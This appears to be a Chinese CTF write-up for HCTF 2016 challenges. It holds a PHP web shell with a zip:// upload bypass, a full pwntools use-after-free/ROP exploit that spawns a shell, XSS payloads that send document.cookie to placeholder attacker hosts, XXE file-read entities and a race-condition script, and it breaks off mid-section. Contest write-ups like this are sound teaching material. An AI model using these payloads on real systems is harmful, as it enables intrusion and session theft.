<p>出于平衡难度梯度的原则，所以出了道图片隐写，因为最近ichunxxx一条龙比赛越来越多，脑洞越来越大，索性就出了个标准的LSB隐写，为了不让题目太简单，我选择塞了一个压缩包进去</p>
<p>如果你要问怎么办，我只能放代码了，如果这个看不懂的话，你可能需要审视一下自己到底是被ctf玩还是玩ctf了</p>
<pre><code># coding: utf-8
from PIL import Image


fflag = open("justastart.zip","rb")
flag = []

while True:
	byte = fflag.read(1)
	if byte == "":
		break
	else:
		hexstr = "%s" % byte.encode("hex")
		decnum = int(hexstr, 16)
		binnum = bin(int(hexstr, 16))[2:].zfill(8)

		for i in xrange(8):
			flag.append(binnum[i:i+1])

flag.reverse()

im = Image.open('misc1.jpg')


width = im.size[0]
height = im.size[1]

pic = Image.new("RGB",im.size)

for y in xrange(height):
	for x in xrange(width):

		pixel = list(im.getpixel((x, y)))

		for i in xrange(3):
			count = pixel[i]%2

			if len(flag) == 0:
				break

			if count == int(flag.pop()):
				continue

			if count == 0:
				pixel[i]+=1

			elif count == 1:
				pixel[i]-=1

		pic.putpixel([x, y],tuple(pixel))

pic.save("flag.png")</code></pre>
<p>顺手附上解密代码     </p>
<pre><code># coding: utf-8
from PIL import Image

im = Image.open('flag.png')


width = im.size[0]
height = im.size[1]

a = ""
aa = ""

for y in xrange(height):
	for x in xrange(width):

		pixel = im.getpixel((x, y))

		for i in xrange(3):
			aa += str(pixel[i]%2)

for i in xrange(len(aa)):
	try:
		a += chr(int(aa[i*8:i*8+8],2))
	except:
		break

fflag = open("test.zip","w")

fflag.write(a)
fflag.close()

</code></pre>
<p>如果你还不清楚怎么发现lsb特征的话，你可能需要`Stegsolve`这个工具</p>
<h3>## gogogo ##</h3>
<blockquote><p>题目描述：上上下下左左右右baba</p></blockquote>
<p>打游戏而已，就简单的打游戏好了，金手指无敌过关就可以get flag。</p>
<p>有人问有没有逆向解法，事实上其实没有，游戏是通过`Tile Layer Pro`直接对图层的修改，比较特别，有兴趣的人可以去玩玩看</p>
<h3></h3>
<h3></h3>
<h3>## giligili ##</h3>
<p>题目是我很早以前做的sctf q1中的web500,我做的时候踩了坑，所以花了很久，感觉题目很有意思，所以就修改了题目又放上来了。</p>
<p><a href="https://github.com/sternze/CTF_writeups/blob/master/sCTF/2016_Q1/obfuscat/readme.md](https://github.com/sternze/CTF_writeups/blob/master/sCTF/2016_Q1/obfuscat/readme.md" target="_blank">正解wp</a> </p>
<p>最终分数：124</p>
<p>完成队伍：64</p>
<p>解题人数意外的多，感觉还是有很多py的人，迷&#8230;</p>
<p>分析代码</p>
<pre><code>h = new MersenneTwister(parseInt(btoa(answer[_[$[6]]](0, 4)), 32));</code></pre>
<p>首先我们根据第一句得到h，h为一个伪随机的数组，根据前四位构成，所以flag的头hctf很重要。</p>
<p>紧接着很多伪随机数都成了固定的数字，也就便于分析了</p>
<pre><code>o = answer.split("_");</code></pre>
<p>这里把输入根据下划线分割得到o</p>
<pre><code><p>e =- (this[_[$[42]]](_[$[31]](o[1])) ^ s[0]); if (-e != $[21]) return false;</p><p>e ^= (this[_[$[42]]](_[$[31]](o[2])) ^ s[1]); if (-e != $[22]) return false; e -= 0x352c4a9b;</p></code></pre>
<p>根据这部分，相互异或得到了中间两部分的ascii码，这里其实分析逻辑容易进入误区，这里要肯定的是，其实flag一定是可显示的字符，所以肯定不可以是3位或更多位分割，这么一来就很容易确认了</p>
<p>代码到了这里</p>
<pre><code><p>a += _[$[31]](o[3].substring(o[3].length - 2)).split("x")[1];</p><p>//o[3]的最后两位</p><p>d = parseInt(a, 16) == (Math.pow(2, 16)+ -5+ "") + o[3].charCodeAt(o[3].length - 3).toString(16) + "53846" + (new Date().getFullYear()- +1+ "");</p></code></pre>
</p>
<p>出现了很多可变的东西，首先是a</p>
<p>a由o[0]和o[3]共同决定</p>
<pre><code>a = parseInt(_[$[23]]("1", Math.max(o[0].length, o[3].length)), 3) ^ eval(_[$[31]](o[0]));</code></pre>
<p>其次a会在十进制的基础上，拼接上o[3]出大括号的后两位的十六进制，转十进制</p>
<p>`a += _[$[31]](o[3].substring(o[3].length &#8211; 2)).split(&#8220;x&#8221;)[1];`</p>
<p>和a相比较的后面的代码，其中有一个可变量为o[3]的倒数第三位，这里出现了隐藏条件</p>
<blockquote><p>1、中间的o[3]倒数第三位转十六进制后不允许存在字母</p>
<p>2、整体转16进制之后，除了后四位不能存在字母</p>
<p>3、倒数2位必须可显</p>
</blockquote>
<p>综合上面的条件，我们就需要脚本来解决问题了</p>
<pre><code><p>for i in range(30,120):</p><p>	 if 'a' not in hex(int("65531" + repr(i) + "53846" + "2015"))[2:-5]:</p><p>	 	if 'b' not in hex(int("65531" + repr(i) + "53846" + "2015"))[2:-5]:</p><p>	 		if 'c' not in hex(int("65531" + repr(i) + "53846" + "2015"))[2:-5]:</p><p>	 			if 'd' not in hex(int("65531" + repr(i) + "53846" + "2015"))[2:-5]:</p><p>	 				if 'e' not in hex(int("65531" + repr(i) + "53846" + "2015"))[2:-5]:</p><p>	 					if 'f' not in hex(int("65531" + repr(i) + "53846" + "2015"))[2:-5]:</p><p>							print i</p><p>							print hex(int("65531" + repr(i) + "53846" + "2015"))</p><p>							print hex(int("65531" + repr(i) + "53846" + "2015"))[-5:-1]</p><p>							# print chr(int(hex(int("65531" + repr(i) + "53846" + "2015"))[-5:-3],16))</p><p>							# print chr(int(hex(int("65531" + repr(i) + "53846" + "2015"))[-3:-1],16))</p></code></pre>
</p>
<p>下面我们得到了7条，紧接着，筛选可显示字符</p>
<p>只剩下3个了</p>
<pre><code><p>64</p>    <p>0x17481184783f3fL</p>    <p>3f3f</p></code></pre>
<p>只剩下这个了，那么最后二位是**??**,倒数第三位是**d**</p>
<p>那么我们现在还得到了o[3]和o[0]相关的关系，那么我们接下去看</p>
<pre><code><p>i = 0xffff;</p>    <p>n = (f = _[$[23]](o[3].charAt(o[3].length - 4), 3)) == o[3].substring(1, 4);</p>    <p>// f 是o[3]的倒数第4位重复3遍和o[3]234位相等</p>    <p>g = 3;</p>    <p>t = _[$[23]](o[3].charAt(3), 3) == o[3].substring(5, 8) &amp;&amp; o[3].charCodeAt(1) * o[0].charCodeAt(0) == 0x2ef3;</p>    <p>//o[3]的第四位重复三遍和o[3]的678位相同，o[3]第2位的阿斯克码-2×o[0]第1位的阿斯克码==0x2ef3</p></code></pre>
</p>
<p>这里我们拆解0x32ab得到119和101</p>
<p>得到两个字符分别为e和w,那么可以确定2位，但是不确定顺序</p>
<p>下面接着分析</p>
<pre><code><p>i = 0xffff;</p>    <p>g = 3;</p>    <p>h = ((31249*g) &amp; i).toString(16);</p>    <p>i = _[$[31]](o[3].split(f).join("").substring(0, 2)).split("x")[1];</p>    <p>s = i == h;</p></code></pre>
<p>这里的s判断给了我们新的信息，因为h已知，所以我们就能得到o[3]的第一位和第五位，这么一来，o[3]所有的位我们都知道了是</p>
<p>`neee3eeed??`</p>
<p>现在我们知道了长度，可以肯定的是，o[3]肯定比o[1]长，那么基本可以得到o[1]了，回到刚才的逻辑</p>
<pre><code>a = parseInt(_[$[23]]("1", Math.max(o[0].length, o[3].length)), 3) ^ eval(_[$[31]](o[0]));</code></pre>
<p>这里我们得到的o[0]为`h3r3`, 特别的是，我们刚才得到o[0]第一位为w，这里有个小坑，由于`parseInt(_[$[23]](&#8220;1&#8243;, Math.max(o[0].length, o[3].length)), 3)`过小，所以异或没有影响到所有的位，根据意思，我们加上了w，那么getflag</p>
<pre><code>hctf{wh3r3_iz_y0ur_neee3eeed??}</code></pre>
<h3></h3>
<h3></h3>
<h3>## 兵者多诡 ##</h3>
<p>进去后发现是个上传图片的网站，这里可能存在文件上传漏洞</p>
<p>先随便上传一个文件进去，提示 `只能上传PNG图片`，猜测可能对文件后缀名做了检测。经过测试后发现上传的文件都被强制改了后缀 .png，`%00`截断的方法因已经修复不能用了。</p>
<p>我们回来看下这里的 fp 参数其实很明显，代表包含文件的文件名，可以采用<a href="http://php.net/manual/zh/wrappers.php.php">PHP协议</a>来读 php 文件源码</p>
<pre><code><p><a href="http://pics.hctf.io/home.php?fp=php://filter/read=convert.base64-encode/resource=home">http://pics.hctf.io/home.php?fp=php://filter/read=convert.base64-encode/resource=home</a></p></code></pre>
<p>可以发现对上传的文件类型做了检测</p>
<pre><code><p>if($type !== 'image/png')
{</p><p>	?&gt;</p><p>	&lt;div class="alert alert-danger" role="alert"&gt;只能上传PNG图片&lt;/div&gt;</p><p>	&lt;?php</p><p>	exit;</p><p>}</p></code></pre>
<p>而且改了后缀名</p>
<pre><code><p>move_uploaded_file($name,"uploads/$imagekey.png");</p></code></pre>
<p>这时候我们可以通过 zip/phar伪协议 来包含文件</p>
<pre><code><p>zip://xxx.png%23shell</p><p>phar://xxx.png/shell</p></code></pre>
<p>首先随便写个 php 文件</p>
<pre><code><p>&lt;?php</p><p> $_GET['a']($_GET['b']);</p><p>?&gt;</p></code></pre>
<p>然后压缩，重命名为 shell.png 来绕过上传检测，这样我们就 getshell 了</p>
<pre><code><p><a href="http://pics.hctf.io/home.php?fp=zip://uploads/515969bfe90c2f52fbcd7e5818e8688b681eea4e.png%23shell&amp;a=system&amp;b=ls">http://pics.hctf.io/home.php?fp=zip://uploads/515969bfe90c2f52fbcd7e5818e8688b681eea4e.png%23shell&amp;a=system&amp;b=ls</a></p></code></pre>
</p>
<p>最后 flag 在上层目录下的一个 php 文件里</p>
<h3></h3>
<h3></h3>
<h3>## 就是干 ##</h3>
<p>这一题算是Hctf中最简单的一个pwn题。但是由于hctf的pwn题普遍不怎么友好。所以这一题也是相当的有难度的题目。</p>
<p>漏洞的触发条件其实很简单，因为这一题的出题思路和题目一样，纯粹的逆向技巧的利用。在delete的时候没有校验这块内存是否被释放过造成的一个double free。因为申请的堆块比较小，所以只能用uaf去解出这一题。</p>
<p>而且我在堆上面布置了一个函数指针，所以使用uaf去覆盖这个函数指针就可以达到任意跳转。</p>
<p><b>### 0&#215;01 uaf构造</b></p>
<pre><code><p>create(4, 'aaa\n')</p><p>create(4, 'aaa\n')</p><p>delete(0)</p><p>delete(1)</p><p>delete(0)</p><p>create(4, '\x00')</p><p>create(0x20, 'a' * 0x16 + 'lo' + '\x2d\x00')</p><p>delete(0)</p></code></pre>
<p>poc中使用了两次creat创建了两个大小一样的fastheap的结构，然后利用了fastheap使用单项链表连接并且不检查double free的特点对两个堆块依次释放，其中第一块我先后释放了两次，这样子会使得fastbin链表变成一个循环链表。再以适当的方式申请内存，就可以使得字符串缓冲区和带有函数指针的控制块重合，使覆盖函数指针成为可能。</p>
<p><b>### 0&#215;02 绕过pie</b></p>
<p>为了绕过pie，需要leak出一个指向ELF文件的地址。正好，堆上就有这样一个函数指针。而且pie保护开启的话，地址的最后一位还是不变的。所以可以通过覆盖一个字节的函数指针最低位，使得本来调用delete函数的指针跳转到一个既能leak出地址，又不能使得程序崩溃的地方。</p>
<p>这里的这一条调用put的语句正好可以leak出堆上的指针，因为本来调用delete的时候，rdi是设置为内存的地址的，而且这一句puts语句正好main函数的死循环中，因为不会retuen，所以不会因为栈不平衡而崩溃。正好可以用来leak出程序的加载地址。</p>
<p><b>### 0&#215;03 利用ROP</b></p>
<p>光光控制一个函数指针还是不能获得shell的，还需要得到libc的加载地址。所以还是需要构造ROP。</p>
<pre><code><p>void deleteStr() {</p><p> int id;</p><p> char buf[0x100];</p><p> printf("Pls give me the string id you want to delete\nid:");</p><p> id = getInt();</p><p> if (id &lt; 0 || id &gt; 0x10) {</p><p> printf("Invalid id\n");</p><p> }</p><p> if (Strings[id].str) {</p><p> printf("Are you sure?:");</p><p> read(STDIN_FILENO,buf,0x100);</p><p> if(strncmp(buf,"yes",3)) {</p><p> return;</p><p> }</p><p> Strings[id].str-&gt;free(Strings[id].str);</p><p> Strings[id].inuse = 0;</p><p> }</p><p>}</p></code></pre>
</p>
<p>所以我在delete的代码中，在调用函数指针之前特意在栈里留了一大块可以任意构造的缓冲区，就是为了覆盖函数指针为一个连续的pop;pop;ret指令，使得rsp指针迁移到一段rop上成为可能。这样就可以使用rop来完成任何想做的事情了。</p>
<p><b>### 0&#215;04获取shell</b></p>
<p>我的poc中并没有用DynELF搜索libc的操作，毕竟出题人自己写poc的时候是可以开挂的。不过如果是选手做题，就需要通过ROP构造一个任意地址读来获取system地址了。不过还是有比较灵性的人猜出了服务器环境，直接找到了对应的libc。总的来说，libc不是一个很大的障碍。</p>
<pre><code><p>#! /usr/bin/python</p><p>from pwn import *</p><p>context.log_level = 'debug'</p><p>target = process('pwn-f')</p><p>def create(size, string):</p><p> target.recvuntil('quit')</p><p> target.sendline('create ')</p><p> target.recvuntil('size:')</p><p> target.sendline(str(size))</p><p> target.recvuntil('str:')</p><p> target.send(string)</p><p>def delete(id):</p><p> target.recvuntil('quit')</p><p> target.sendline('delete ')</p><p> target.recvuntil('id:')</p><p> target.sendline(str(id))</p><p> target.recvuntil('sure?:')</p><p> target.sendline('yes')</p><p>create(4, 'aaa\n')</p><p>create(4, 'aaa\n')</p><p>delete(0)</p><p>delete(1)</p><p>delete(0)</p><p>create(4, '\x00')</p><p>create(0x20, 'a' * 0x16 + 'lo' + '\x2d\x00')</p><p>delete(0)</p><p>target.recvuntil('lo')</p><p>addr = target.recvline()</p><p>addr = addr[:-1]</p><p>addr = u64(addr + '\x00' * (8 - len(addr))) - 0xd2d</p><p>delete(1)</p><p>create(4, '\x00')</p><p>target.recvuntil('quit')</p><p>target.sendline('create ')</p><p>target.recvuntil('size:')</p><p>target.sendline(str(0x20))</p><p>target.recvuntil('str:')</p><p>target.send('a' * 0x18 + p64(0x00000000000011DC + addr))</p><p>print hex(addr)</p><p>target.recvuntil('quit')</p><p>target.sendline('delete ')</p><p>target.recvuntil('id:')</p><p>target.sendline('1')</p><p>target.recvuntil('sure?:')</p><p>ropchain = p64(addr + 0x00000000000011e3) # pop rdi</p><p>ropchain += p64(addr + 0x202070)# got@malloc</p><p>ropchain += p64(addr + 0x0000000000000990)# plt@put</p><p>ropchain += p64(addr + 0x00000000000011e3)# pop rdi</p><p>ropchain += p64(1)</p><p>ropchain += p64(addr + 0x00000000000011DA)# magic</p><p>ropchain += p64(0)# rbx</p><p>ropchain += p64(1)# rbp</p><p>ropchain += p64(addr + 0x0000000000202058)# r12 -&gt; rip got@read</p><p>ropchain += p64(8)# r13 -&gt; rdx</p><p>ropchain += p64(addr + 0x0000000000202078)# r14 -&gt; rsi got@atoi</p><p>ropchain += p64(0)# r15 -&gt; rdi</p><p>ropchain += p64(addr + 0x00000000000011C0)# magic</p><p>ropchain += 'a'*8*7</p><p>ropchain += p64(addr + 0x0000000000000B65)# getInt</p><p>target.sendline('yes ' + ropchain)</p><p>addr = target.recvline()[:-1]</p><p>addr = u64(addr + '\x00' * (8 - len(addr)))</p><p>#addr = addr - 534112 + 288144</p><p>addr = addr - 537984 + 283536</p><p>print hex(addr)</p><p>target.sendline(p64(addr)+'/bin/sh')</p><p>target.interactive()</p></code></pre>
<h3></h3>
<h3></h3>
<h3>## Crypto So Interesting ##</h3>
<pre><code><p>题目: &lt;<a href="https://github.com/Hcamael/ctf-library/tree/master/RSA1">https://github.com/Hcamael/ctf-library/tree/master/RSA1</a>&gt;</p><p>payload: &lt;<a href="https://github.com/Hcamael/ctf-library/blob/master/RSA1/rsa1_payload.py">https://github.com/Hcamael/ctf-library/blob/master/RSA1/rsa1_payload.py</a>&gt;</p></code></pre>
</p>
<p>出题时预测的分数在300分左右, 不过看完选手的wp后发现这题出现了重大失误, 现在来看, 这题只值150分左右, 但是实际情况只有23个队解出了该题.</p>
<p>本题思路来源: <b>基于隐藏指数的RSA-HSDβ算法, 全称为隐藏小私有指数δ的RSA后门密钥生成算法</b>.</p>
<p>改算法依赖于<a href="https://github.com/pablocelayes/rsa-wiener-attack">wiener</a>小指数攻击方法</p>
<p>后门生成流程:</p>
<p> </p>
<p style="text-align: center;"> <img alt="Image" data-original="http://image.3001.net/images/20161202/14806124648807.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="400" height="650">     </p>
<noscript><img alt="Image" src="http://image.3001.net/images/20161202/14806124648807.png!small" width="400" height="650">     </p></noscript>
<p>其中`β`是在`2^(k-1) ± 2^(k/2)`范围内的素数, 转置函数的作用是在`β`非常大的情况下, 返回值可以认为是PRP(Pseudo-Random Permutation). 转置函数可以有好几种形式, 我选取的是一种比较简单的转置函数.</p>
<p>从上面的流程可以看出这题非常的简单, 要逆向也是很容易的, 所以该题为本届HCTF密码学的签到题</p>
<p>逆向思路:</p>
<p style="text-align: center;"><img alt="hctf_rsa1_2.png" data-original="http://image.3001.net/images/20161202/14806125737610.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="300" height="700"> </p>
<noscript><img alt="hctf_rsa1_2.png" src="http://image.3001.net/images/20161202/14806125737610.png!small" width="300" height="700"> </p></noscript>
<p>从上图可以看出本题只涉及到了wiener算法, 难度差不多是150左右</p>
<blockquote><p>出题时本来是准备考两种算法的, 一种是wiener算法, 一种是[Riemann's hypothesis and tests for primality](<a href="https://www.cs.cmu.edu/">https://www.cs.cmu.edu/</a>~glmiller/Publications/Papers/Mi76.pdf), payload中的`divide_pq`函数, 已知e, d, n质因数分解p和q(&lt;<a href="http://www.di-mgt.com.au/rsa_factorize_n.html">http://www.di-mgt.com.au/rsa_factorize_n.html</a>&gt;)</p>
<p>原本设计着算出`(ϵ, δ)`后, 根据`(ϵ, δ, n)`分解出`q`和`p`, 但是出题失误, 导致只需要wiener算法就能getflag</p>
</blockquote>
<p>PS1: 不过还是出现了非预期, ROIS的dalao利用wiener算法分解出`p`和`q`, &lt;<a href="https://github.com/Hcamael/ctf-library/blob/master/RSA1/rsa_s.py">https://github.com/Hcamael/ctf-library/blob/master/RSA1/rsa_s.py</a>&gt;</p>
<p>PS2: 基于隐藏指数的RSA后门生成算法除了本题涉及的还有`RSA-HSPEβ`和`RSA-HSEβ`</p>
<h2><b><br /></b></h2>
<h2><b><br /></b></h2>
<h2><b># Level 3 #</b></h2>
<h3>## Crypto So Cool ##</h3>
<blockquote><p>题目: &lt;<a href="https://github.com/Hcamael/ctf-library/tree/master/RSA2">https://github.com/Hcamael/ctf-library/tree/master/RSA2</a>&gt;</p>
<p>payload:</p>
<p>- &lt;<a href="https://github.com/Hcamael/ctf-library/blob/master/RSA2/rsa2_payload.py">https://github.com/Hcamael/ctf-library/blob/master/RSA2/rsa2_payload.py</a>&gt;</p>
<p>- &lt;<a href="https://github.com/Hcamael/ctf-library/blob/master/RSA2/rsa2_payload.sage">https://github.com/Hcamael/ctf-library/blob/master/RSA2/rsa2_payload.sage</a>&gt;</p>
</blockquote>
<p>出题时预测的分数在400分左右, 实际情况只有7个队解出了该题. 和预测差不多, 最后放了一波hint, 要不然可能会更少.</p>
<p><b>本题思路来源: 基于隐藏素数因子的RSA-HPβ算法</b></p>
<p>该后门算法依赖于`Coppersmith partial information attack`算法, <a href="http://inaz2.hatenablog.com/entries/2016/01/20">sage实现该算法</a></p>
<p>后门生成流程:</p>
<p> </p>
<p style="text-align: center;"><img alt="hctf_rsa2_1.png" data-original="http://image.3001.net/images/20161202/14806131822676.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="500" height="1559">     </p>
<noscript><img alt="hctf_rsa2_1.png" src="http://image.3001.net/images/20161202/14806131822676.png!small" width="500" height="1559">     </p></noscript>
<p> </p>
<p>该算法的核心在于把p的前半部分比特隐写到n中</p>
<blockquote><p>τ的长度为k/16比特</p>
<p>μ的长度为5k/16比特</p>
<p>λ的长度为5k/8比特</p>
<p>所以n的长度为k比特</p>
<p>`p * (q xor random(k/8比特长度))`的前3k/8比特的值是不变的</p>
</blockquote>
<p>所以可以成功把τ, μ隐写到n中</p>
<p>逆向思路:</p>
<p style="text-align: center;"><img alt="hctf_rsa2_2.png" data-original="http://image.3001.net/images/20161202/14806133147878.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="280" height="1378">     </p>
<noscript><img alt="hctf_rsa2_2.png" src="http://image.3001.net/images/20161202/14806133147878.png!small" width="280" height="1378">     </p></noscript>
<p>该题的难点主要在于`Coppersmith partial information attack`算法, 能在放hint前做出的队伍都是在github上找到了该算法的脚本&lt;<a href="https://github.com/Gao-Chuan/RSA-and-LLL-attacks">https://github.com/Gao-Chuan/RSA-and-LLL-attacks</a>&gt;</p>
<h3><b><br /></b></h3>
<h3><b><br /></b></h3>
<h3><b>## guestbook ##</b></h3>
<p>上来就是一个留言板，看起来就是xss题目，至于下面的md5碰撞，只是为了减少无意义的请求，差不多是验证码的性质，有些人可能没接触过，那么附上一个碰撞脚本</p>
<pre><code><p>def crack_code(code):</p><p>	str = 10000</p><p>	while 1:</p><p>		m2 = hashlib.md5()</p><p>		m2.update(repr(str))</p><p>		if (m2.hexdigest()[0:4]==code):</p><p>			return str</p><p>			break</p><p>		str+=1</p><p>print crack_code('84a3')</p></code></pre>
</p>
<p>差不多4位的md5只要几秒就跑到了，回到题目正题，从代码中我们可以看到基本的过滤</p>
<pre><code><p>function filter($string)</p><p>{</p><p>	$escape = array('\'','\\\\');</p><p>	$escape = '/' . implode('|', $escape) . '/';</p><p>	$string = preg_replace($escape, '_', $string);</p><p>	$safe = array('select', 'insert', 'update', 'delete', 'where');</p><p>	$safe = '/' . implode('|', $safe) . '/i';</p><p>	$string = preg_replace($safe, 'hacker', $string);</p><p>	$xsssafe = array('img','script','on','svg','link');</p><p>	$xsssafe = '/' . implode('|', $xsssafe) . '/i';</p><p>	return preg_replace($xsssafe, '', $string);</p><p>}</p></code></pre>
</p>
<p>我们看到其实只有很少的过滤，而且是单层的，对于xss来说，只需要复写2次就可以绕过了，类似于</p>
<p>`scrscriptipt`这样。</p>
<p>所以其实关键在于CSP</p>
<pre><code>Content-Security-Policy:default-src 'self'; script-src 'self' 'unsafe-inline'; font-src 'self' fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self'</code></pre>
<p>不熟悉的人可能并不清楚其中的CSP有什么样的问题，试试上，整个CSP除了限定了域以外，没有做任何的限制，可以执行任意的js，这也就导致了使用人数比较多的非预期做法。</p>
<p><b>### 跳转绕过 ###</b></p>
<pre><code><p>&lt;scrscriptipt&gt;window.open("<a href="http://xxxx:8080/cookie.asp?msg=">http://xxxx:8080/cookie.asp?msg=</a>"+document.body)&lt;/scrscr iptipt&gt;</p><p>&lt;scrscriptipt&gt;window.locatioonn.href%3d"http%3a//<a href="http://www.example.com/xss/write.php%3fdomain%3d">www.example.com/xss/write.php%3fdomain%3d</a>"%2bescape(document.cookie)%3b&lt;/sscriptcript&gt;</p><p>&lt;scrscriptipt&gt;var a=document.createElement("a");a.href='<a href="http://xss.com/?cookie=">http://xss.com/?cookie=</a>'+escape(document.cookie);a.click();&lt;/sscriptcript&gt;</p></code></pre>
</p>
<p>上面几种思路类似，通过构造新开页面或者跳转来解决域限制，由于js可以任意构造，所以这里也就通过特别的方式绕过了原本的限制。</p>
<p><b>### chrome对CSP支持的不完整绕过 ###</b></p>
<p>这种也就是我出题的本意，从文章中可以获得对漏洞的整体了解，主要是2篇</p>
<p><a href="http://paper.seebug.org/91/">http://paper.seebug.org/91/</a></p>
<p>当然我自己也写了分析文章<a href="http://lorexxar.cn/2016/10/28/csp-then/">http://lorexxar.cn/2016/10/28/csp-then/</a></p>
<p>这里我的后台bot使用的也正是chrome浏览器，由于浏览器对CSP特性支持的不完整，导致link标签的白名单特性存在跨域请求的能力，所以构造payload</p>
<pre><code>&lt;Scscriptript&gt;var n0t = document.createElement("liscriptnk");n0t.setAttribute("rel", "prefetch");n0t.setAttribute("href", "//xxx:2333/" + document.cookie);document.head.appendChild(n0t);&lt;/Scscriptript&gt;</code></pre>
<p>后面xss平台或者vps接受一发搞定</p>
<h3></h3>
<h3></h3>
<h3>## 出题人失踪了 (brop) ##</h3>
<p>这一题的内部使用名字是brop，因为这一题的出题思路和做题思路都是来源于一篇论文</p>
<p><a href="http://www.scs.stanford.edu/brop/">http://www.scs.stanford.edu/brop/</a></p>
<p>所以知道这篇论文的人应该很快就能意识到这一题的做法</p>
<h3></h3>
<h3></h3>
<h3>## 必须比香港记者跑得快 ##</h3>
<p>扫目录找到README.md可以得到hint</p>
<blockquote><p>2016.11.11 完成登陆功能，登陆之后在session将用户名和用户等级放到会话信息里面。 判断sessioin['level']是否能在index.php查看管理员才能看到的东西。 XD</p>
<p>2016.11.10 老板说注册成功的用户不能是管理员，我再写多一句把权限降为普通用户好啰。</p>
<p>2016.10 我把注册功能写好了</p>
</blockquote>
<p>条件竞争，直接附上脚本</p>
<pre><code><p># -*- coding:utf-8 -*-</p><p>import requests</p><p>import threading</p><p>for i in range(0,9):</p><p>	a = "cccccccc"+str(i)</p><p>	data = { 'username': a , 'password': a , 'gogogo' : '苟!'}</p><p>	def register(a):</p><p>		r = requests.post(url = "http://changelog.hctf.io/register.php" , data = data )</p><p>	def login(a):</p><p>		r = requests.post(url = "http://changelog.hctf.io/login.php" , data = data)</p><p>		if "You level is zero, so you can't touch me!" not in r.content:</p><p>			print r.content</p><p>			exit()</p><p>	threading.Thread(target = login , args =(a,)).start()</p><p>	threading.Thread(target = register , args =(a,)).start()</p></code></pre>
</p>
<h3></h3>
<h3></h3>
<h3>## asm ##</h3>
<p>asm的解释器</p>
<p>附带字节码生成</p>
<p>好像大家都是先leak出libc，再做的，但其实并不用leak，替换strcmp@plt 为 malloc@plt即可call system</p>
<h2><b><br /></b></h2>
<h2><b><br /></b></h2>
<h2><b># Level 4 #</b></h2>
<h3>## 大图书管的牧羊人&amp;&amp;魔法禁书目录 ##</h3>
<p>在公司膜Ricter的时候想到的思路。</p>
<blockquote><p>预期内的做法(general)：</p>
<p>1. 信息泄漏</p>
<p> 2. CBC flip 或者 Padding Oracle 伪造管理员上线</p>
<p> 3. 了解epub文件，构造XXE任意文件读取flag.php</p>
</blockquote>
<p>&gt; 如果没有第一步，作为一道黑盒题目，你能够<b>摸清套路</b>吗？ ^_^</p>
<p>P.S. Aklis灵魂运维，在部署这道题目的时候忘了上vhost的配置了，导致可以在获得admin身份之后直接上传包含webshell的zip压缩包。</p>
<p>用 comm.php 的加解密伪造也是我的锅，密钥是23333，然后我忘了几个3，后来在第五层的禁书目录其实就多了两个3，Orz。</p>
<p>在第四层按我的出题思路怼的师傅可以瞬秒禁书目录。</p>
<p>通过php://filter构造</p>
<pre><code><p>XML</p><p>&lt;!ENTITY payload SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php"&gt;</p></code></pre>
<p>直接回显</p>
<pre><code><p>&lt;navPoint id="coverpage" playOrder="0"&gt;</p><p>&lt;navLabel&gt;&lt;text&gt;&amp;payload;&lt;/text&gt;&lt;/navLabel&gt;</p></code></pre>
<p>但这样的话，别人能看得到哦，自己忘了覆盖回去让其它选手捡了便宜 XD</p>
<p>&gt; 更合适的作法是通过远程的XXE回显。</p>
<p><b>两题的flag</b></p>
<pre><code><p>&lt;?php</p><p>$flag = "hctf{Serena_is_the_leading_role}";</p></code></pre>
<pre><code><p>&lt;?php</p><p>$flag = "hctf{Lillie_is_comming}";</p></code></pre>
<h3></h3>
<h3></h3>
<h3>## secret area ##</h3>
<p>打开页面发现了聊天版性质的站，进出找一找发现有这么几个功能：</p>
<p>注册-&gt;登陆-&gt;可以修改个人信息河头乡-&gt;向任何人留言</p>
<p>稍微测试，不难发现</p>
<pre><code>Content-Security-Policy:default-src 'self'; script-src<a href="http://sguestbook.hctf.io/static/">http://sguestbook.hctf.io/static/</a>'sha256-n+kMAVS5Xj7r/dvV9ZxAbEX6uEmK+uen+HZXbLhVsVA=' 'sha256-2zDCsAh4JN1o1lpARla6ieQ5KBrjrGpn0OAjeJ1V9kg='    'sha256-SQQX1KpZM+ueZs+PyglurgqnV7jC8sJkUMsG9KkaFwQ=' 'sha256-JXk13NkH4FW9/ArNuoVR9yRcBH7qGllqf1g5RnJKUVg=' 'sha256-NL8WDWAX7GSifPUosXlt/TUI6H8JU0JlK7ACpDzRVUc=' 'sha256-CCZL85Vslsr/bWQYD45FX+dc7bTfBxfNmJtlmZYFxH4=' 'sha256-2Y8kG4IxBmLRnD13Ne2JV/V106nMhUqzbbVcOdxUH8I='    'sha256-euY7jS9jMj42KXiApLBMYPZwZ6o97F7vcN8HjBFLOTQ=' 'sha256-V6Bq3u346wy1l0rOIp59A6RSX5gmAiSK40bp5JNrbnw='; font-src<a href="http://sguestbook.hctf.io/static/">http://sguestbook.hctf.io/static/</a>fonts.gstatic.com; style-src 'self' 'unsafe-inline';    img-src 'self'</code></pre>
<p>CSP限制的域差不多符合以下几个条件:</p>
<pre><code><p>1、script没有开启unsafe-inline，也就是说不允许内联脚本</p><p>2、script只允许static目录，但这个目录下内容不可控</p><p>3、style-src开启了unsafe-inline而且是self（这里其实是不小心的失误）</p><p>4、default-src为self，也就是站内请求都是被许可的</p></code></pre>
<p><b>### 正解 ###</b></p>
<pre><code><p>综合CSP的限制，我们需要回去想想题目中给的条件，有几个比较重要的。</p><p>1、static下不存在任何非静态文件，除了redirect.php</p><p>2、redirect.php的跳转位置可以自定义</p><p>3、我们上传的头像没有任何上传漏洞，上传位置是/upload/</p></code></pre>
<p>这里先给出一篇文章</p>
<p><a href="http://lorexxar.cn/2016/10/31/csp-then2/">http://lorexxar.cn/2016/10/31/csp-then2/</a></p>
<p>根据文章，我们不难发现，现在所有的条件都符合，如果顺着思路到这里，很容易就会想到下一步</p>
<p>构造上传图像为</p>
